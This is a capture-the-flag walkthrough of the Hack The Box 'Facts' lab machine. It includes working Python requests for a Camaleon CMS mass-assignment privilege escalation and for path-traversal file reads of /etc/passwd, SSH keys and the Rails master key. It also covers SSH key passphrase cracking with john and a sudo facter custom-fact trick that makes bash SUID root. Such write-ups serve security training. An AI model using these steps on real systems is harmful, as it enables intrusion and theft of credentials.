# Facts — HTB Machine Walkthrough
**Difficulty:** Easy | **IP:** 10.129.17.87 | **OS:** Ubuntu 25.04

---

## Flags
- **User:** `********************************`
- **Root:** `********************************`

---

## Reconnaissance

### Port Scan
```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.9p1
80/tcp    open  http     nginx/1.26.3
54321/tcp open  unknown  MinIO
```

### Web Application
- **CMS:** Camaleon CMS v2.9.0 (Ruby on Rails 8.0.2)
- **Server:** nginx → Puma (port 3000) → Rails app
- **Domain:** facts.htb
- **Storage:** MinIO (S3-compatible) on port 54321

### Key Technologies
| Component | Version |
|-----------|---------|
| Camaleon CMS | 2.9.0 |
| Rails | 8.0.2 |
| Ruby | 3.3.7 |
| MinIO | (S3-compatible) |
| SQLite3 | Production database |
| Puma | Web server |
| Docker | App runs in container |

---

## Exploitation Chain

### Step 1: User Registration + Captcha Bypass
- Navigated to `http://facts.htb/admin/register`
- Solved captcha using **pytesseract OCR**
- Registered user `testus***` with password `*******`
- Role assigned: **client** (low privilege)

### Step 2: Privilege Escalation — CVE-2025-2304
**Camaleon CMS Mass Assignment via `updated_ajax`**

The `updated_ajax` endpoint uses `params.require(:password).permit!` which allows mass assignment of the `role` parameter.

```python
data = {
    '_method': 'patch',
    'authenticity_token': token,
    'password[password]': 'Testpass****',
    'password[password_confirmation]': 'Tes*****',
    'password[role]': 'admin',  # ← Mass assignment!
}
s.post(f'{BASE}/admin/users/{uid}/updated_ajax', data=data,
       headers={'X-Requested-With': 'XMLHttpRequest', 'X-CSRF-Token': token})
```

**Result:** User escalated from `client` to `admin` role. Gained access to CMS settings, media panel, and S3 configuration.

### Step 3: MinIO S3 Credentials Extraction
From `http://facts.htb/admin/settings/site` → Filesystem Settings tab:

| Setting | Value |
|---------|-------|
| Access Key | `AKIAE1CB24*******` |
| Secret Key | `05oJ/fkatqUzf3bsggr*****` |
| Bucket | `randomfacts` |
| Region | `us-east-1` |
| Endpoint | `http://localhost:54321` |

Configured `mc` (MinIO client):
```bash
mc alias set factsminio http://10.129.17.87:54321 \
  AKIAE1CB245***** 05oJ/fkatqUzf3bsggrEN*****
```

### Step 4: Discover Encrypted SSH Key
```bash
mc ls factsminio/internal/.ssh/
# Found: id_ed25519, authorized_keys, known_hosts

mc cat factsminio/internal/.ssh/id_ed25519
# Encrypted ed25519 private key (bcrypt)
```

### Step 5: CVE-2026-1776 — Arbitrary File Read
**Path traversal in AWS S3 uploader via `file_upload` parameter**

The media upload endpoint (`/admin/media/upload?actions=true`) accepts a `file_upload` parameter that can be a **local file path**. The CMS reads the file and uploads it to S3, allowing arbitrary file reads.

```python
r = s.post(f'{BASE}/admin/media/upload?actions=true', 
           data={'file_upload': '/proc/self/cwd/config/master.key', 'folder': '/'})
```

**Files successfully read:**
- `/etc/hostname` → `facts`
- `/etc/nginx/sites-enabled/facts.htb` → nginx config (proxy to Rails + MinIO)
- `/etc/ssh/sshd_config` → `PermitRootLogin yes`, `PasswordAuthentication yes`
- `/proc/self/cwd/Dockerfile` → App runs as `rails` user (UID 1000) in Docker
- `/proc/self/cwd/config/database.yml` → SQLite3 at `storage/production.sqlite3`
- `/proc/self/cwd/Gemfile` → Camaleon CMS v2.9.0 confirmed
- `/proc/self/cwd/config/master.key` → `b0650437b2208a9fab449fb92f67bc40`
- `/proc/self/cwd/config/credentials.yml.enc` → Rails encrypted credentials

**Content filter bypass** — Some files blocked by `file_content_unsafe?` check (patterns: `<script>`, `data:`, etc.)

**Alternative: `download_private_file` endpoint** — No content filter!
```python
# /etc/passwd via private file download + path traversal
r = s.get(f'{BASE}/admin/media/download_private_file', 
          params={'file': '../../../etc/passwd'})
```

This revealed system users:
- **`trivia`** (UID 1000, comment: "facts.htb") — main user
- **`william`** (UID 1001) — user flag location

And trivia's SSH private key (same encrypted key from S3):
```python
r = s.get(f'{BASE}/admin/media/download_private_file',
          params={'file': '../../../home/trivia/.ssh/id_ed25519'})
```

### Step 6: Rails Credentials Decryption
Decrypted `credentials.yml.enc` using master key:
```ruby
key = File.read("/tmp/master.key").strip
content = File.read("/tmp/credentials.yml.enc").strip
encryptor = ActiveSupport::MessageEncryptor.new([key].pack("H*"), cipher: "aes-128-gcm")
result = encryptor.decrypt_and_verify(content)
```

**Result:** Only contained `secret_key_base` — no useful credentials.

### Step 7: Crack SSH Key Passphrase
```bash
python3 /usr/share/john/ssh2john.py /tmp/id_ed25519 > /tmp/ssh_hash.txt
/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/ssh_hash.txt
```

**Passphrase: `dragonballz`** 🎉

### Step 8: SSH Access
```bash
ssh -i /tmp/id_ed25519 trivia@10.129.17.87
# Passphrase: drag****
# uid=1000(trivia) gid=1000(trivia)
```

**User Flag:** `cat /home/william/user.txt` → `**********`

---

## Privilege Escalation

### sudo -l
```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

### `facter` Custom Fact Abuse

`facter` supports `--custom-dir` to load custom Ruby facts. By creating a malicious fact that executes arbitrary commands:

```bash
mkdir -p /tmp/factdir
cat > /tmp/factdir/root_shell.rb << 'RUBY'
Facter.add(:root_shell) do
  setcode do
    %x{chmod u+s /bin/bash}
    "done"
  end
end
RUBY

sudo /usr/bin/facter --custom-dir=/tmp/factdir root_shell
# This makes /bin/bash SUID root

/bin/bash -p
# uid=1000(trivia) gid=1000(trivia) euid=0(root)
```

**Root Flag:** `cat /root/root.txt` → `**********`

---

## Vulnerabilities Used

| CVE | Description | Impact |
|-----|-------------|--------|
| CVE-2025-2304 | Mass assignment in `updated_ajax` via `password[role]` | Privilege escalation (client → admin) |
| CVE-2026-1776 | Path traversal in AWS S3 uploader `file_upload` parameter | Arbitrary file read from server |
| N/A | `download_private_file` path traversal | Bypass content filter, read arbitrary files |
| N/A | `facter` custom fact loading | Root code execution via sudo |

---

## Timeline
- **Recon:** Port scan, CMS identification, MinIO discovery
- **Foothold:** Register user → CVE-2025-2304 priv esc → S3 credentials → CVE-2026-1776 file read
- **User:** Crack SSH key passphrase (`dra*****`) → SSH as `trivia` → read `/home/william/user.txt`
- **Root:** `sudo facter --custom-dir` → SUID bash → root shell

---

## Tools Used
- nmap, gobuster
- Python (requests, pytesseract, Pillow)
- mc (MinIO client), awscli
- john (SSH key cracking)
- Ruby (Rails credentials decryption)
- ssh-agent, ssh
